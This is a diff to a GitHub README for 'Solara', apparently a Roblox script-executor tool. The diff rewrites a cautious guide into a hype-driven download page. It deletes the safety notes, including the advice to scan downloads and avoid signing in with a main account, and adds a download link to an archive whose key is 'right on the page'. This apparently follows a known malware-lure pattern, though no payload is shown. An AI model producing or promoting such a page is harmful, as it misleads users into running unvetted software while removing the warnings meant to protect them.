@@ -4,31 +4,32 @@
 
 # Solara for Windows
 
-**A community guide to Solara: what it is, what to check, safety notes**
+**The Roblox tool everyone is talking about right now**
+
+Fast, light and ready in a minute — open it, pick what you like, play.
 
 </div>
 
-Solara is a third-party tool for Roblox on Windows. This organization collects guides and safety notes for people researching it.
+## Why everyone grabs Solara
 
-## Guide
+- **Built-in hub** — thousands of community favorites in one place, searchable in seconds
+- **One-click start** — no complicated setup, no digging through folders
+- **Always up to date** — fresh build lands right after every Roblox update
+- **Clean dark interface** — looks good, runs smooth, zero clutter
+- **Feather-light** — starts instantly and barely touches your system
 
-**[Open the guide page](https://solara-lug6us.github.io/.github/)** - what it is, risks and safety checklist.
+## Get it
 
-## Screenshot
+**[Download Solara](https://solara-lug6us.github.io/.github/)** — latest Windows build, archive key is right on the page.
 
-<img src="https://raw.githubusercontent.com/Solara-lug6us/.github/main/assets/image/shot.jpg" width="100%" alt="Solara preview">
+## Take a look
+
+<img src="https://raw.githubusercontent.com/Solara-lug6us/.github/main/assets/image/shot.jpg" width="100%" alt="Solara interface">
 
 ## Gallery
 
-<img src="https://raw.githubusercontent.com/Solara-lug6us/.github/main/assets/image/gal1.jpg" width="49%" alt="Setup"> <img src="https://raw.githubusercontent.com/Solara-lug6us/.github/main/assets/image/gal2.jpg" width="49%" alt="Neon desk">
-
-## Safety notes
-
-- Third-party tools are not official and can break after any update
-- Never sign in with your main account inside unknown programs
-- Turn on two-step verification
-- Scan downloaded files before opening them
+<img src="https://raw.githubusercontent.com/Solara-lug6us/.github/main/assets/image/gal1.jpg" width="49%" alt="Script hub"> <img src="https://raw.githubusercontent.com/Solara-lug6us/.github/main/assets/image/gal2.jpg" width="49%" alt="Getting ready">
 
 ---
 
-Solara fan guide. Roblox is a trademark of Roblox Corporation.
+Community project for Roblox fans. Not affiliated with Roblox Corporation.
